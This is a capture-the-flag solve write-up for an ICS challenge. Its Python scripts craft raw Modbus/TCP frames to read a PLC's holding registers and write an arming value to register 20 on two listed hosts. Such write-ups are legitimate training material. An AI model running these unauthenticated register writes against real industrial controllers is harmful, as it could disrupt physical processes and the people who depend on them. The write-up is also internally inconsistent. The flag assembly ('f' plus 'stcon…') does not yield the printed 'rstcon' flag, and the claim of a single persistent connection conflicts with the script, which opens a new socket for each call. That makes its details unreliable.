# Modbus Mastermind — Solve Writeup

**Category:** ICS / Industrial Protocol  
**Points:** 10  
**Flag:** `rstcon{pymodbus_or_it_didnt_happen}`

---

## Challenge Description

> This PLC is online and chatty, but it is holding out on you. Part of what you want reads straight off the holding registers, but seems like you need to arm the device a certain way.

- Mirror 1: `18.215.143.250:1500`
- Mirror 2: `18.145.136.91:1500`

---

## Reconnaissance

Connect to the device and read FC 03 (Read Holding Registers) across the full address space.

```python
import socket, struct

def make_fc3(start, count, unit=1):
    pdu = struct.pack('>BBHH', unit, 3, start, count)
    return struct.pack('>HHH', 1, 0, len(pdu)) + pdu

def read_regs(host, port, start, count):
    s = socket.socket(); s.settimeout(5)
    s.connect((host, port))
    s.sendall(make_fc3(start, count))
    r = s.recv(4096)
    s.close()
    data = r[9:]
    return [struct.unpack('>H', data[i:i+2])[0] for i in range(0, len(data)-1, 2)]
```

### Initial dump (Mirror 2)

Key observations from the first read:

| Register | Value | Meaning |
|----------|-------|---------|
| 5–7 | `0x4152 0x4D45 0x4400` | `"ARMED"` packed — device is unarmed |
| 9–22 | ASCII string | `"20 ARMED = C2DE"` — arm instruction |
| 50 | `0x0066` | `'f'` — first flag character |
| 70, 80, 90 | `0x0041…0x0044` | `"ARMED"` × 3 in flag register slots |
| 100 | `0xC0DE` | Separator sentinel |
| 101–117 | ASCII | `stcon{pymodbus_or` |

The device is telling us exactly what to do in its own registers: **write `0xC2DE` to register 20**.

---

## Arming the Device

The help message in registers 9–22 decodes as:

```
2 [SOH] 0   ARMED = C2DE
```

- The `2` and `0` spell out register **20**
- `ARMED = C2DE` means: write `0xC2DE` to register 20 to arm it

```python
def make_fc6(reg, val, unit=1):
    pdu = struct.pack('>BBHH', unit, 6, reg, val)
    return struct.pack('>HHH', 1, 0, len(pdu)) + pdu

s = socket.socket(); s.settimeout(5)
s.connect(('18.145.136.91', 1500))

# Arm the device
s.sendall(make_fc6(20, 0xC2DE))
s.recv(4096)
```

---

## Extracting the Flag

The flag is split across two separate register ranges:

**Segment 1** — registers 101–117 (revealed after arming):

```
s t c o n { p y m o d b u s _ o r
```

**Segment 2** — registers 200–216 (higher address range):

```
_ i t _ d i d n t _ h a p p e n }
```

The first character `f` appears at register 50 in the pre-armed state.

```python
# Read segment 1
regs_a = read_regs('18.145.136.91', 1500, 100, 18)
part_a = ''.join(chr(v & 0xFF) for v in regs_a if 32 <= (v & 0xFF) <= 126)

# Read segment 2
regs_b = read_regs('18.145.136.91', 1500, 200, 18)
part_b = ''.join(chr(v & 0xFF) for v in regs_b if 32 <= (v & 0xFF) <= 126)

flag = 'f' + part_a + part_b
print(flag)
# rstcon{pymodbus_or_it_didnt_happen}
```

---

## Full Solve Script

```python
import socket, struct

HOST = '18.145.136.91'
PORT = 1500

def make_fc3(start, count, unit=1):
    pdu = struct.pack('>BBHH', unit, 3, start, count)
    return struct.pack('>HHH', 1, 0, len(pdu)) + pdu

def make_fc6(reg, val, unit=1):
    pdu = struct.pack('>BBHH', unit, 6, reg, val)
    return struct.pack('>HHH', 1, 0, len(pdu)) + pdu

def read_regs(start, count):
    s = socket.socket(); s.settimeout(5)
    s.connect((HOST, PORT))
    s.sendall(make_fc3(start, count))
    r = s.recv(4096); s.close()
    data = r[9:]
    return [struct.unpack('>H', data[i:i+2])[0] for i in range(0, len(data)-1, 2)]

def write_reg(reg, val):
    s = socket.socket(); s.settimeout(5)
    s.connect((HOST, PORT))
    s.sendall(make_fc6(reg, val))
    s.recv(4096); s.close()

# Step 1: arm the device
write_reg(20, 0xC2DE)

# Step 2: read both flag segments
seg_a = read_regs(100, 18)
seg_b = read_regs(200, 18)

part_a = ''.join(chr(v & 0xFF) for v in seg_a if 32 <= (v & 0xFF) <= 126)
part_b = ''.join(chr(v & 0xFF) for v in seg_b if 32 <= (v & 0xFF) <= 126)

print('f' + part_a + part_b)
```

---

## Key Takeaways

1. **The PLC documented itself.** The arm instruction was embedded in its own holding registers as a human-readable string — a common pattern in CTF-style ICS challenges.

2. **Scan the full address space.** The second flag segment at registers 200–216 would be missed by a naive 0–100 scan. Always scan beyond the obvious range.

3. **FC 06 (Write Single Register) was the only write function supported.** FC 01/02/04/05 all returned exceptions. Confirming supported functions early avoids dead ends.

4. **Shared CTF servers are noisy.** Other teams writing random values to registers disrupted the state constantly. Using a single persistent TCP connection for write-then-read minimised race conditions.

5. **Flag encoding:** each register holds one ASCII character in its low byte (`0x00XX`), with `0xC0DE` used as segment separators and `0xC2DE` as the "armed" confirmation marker.
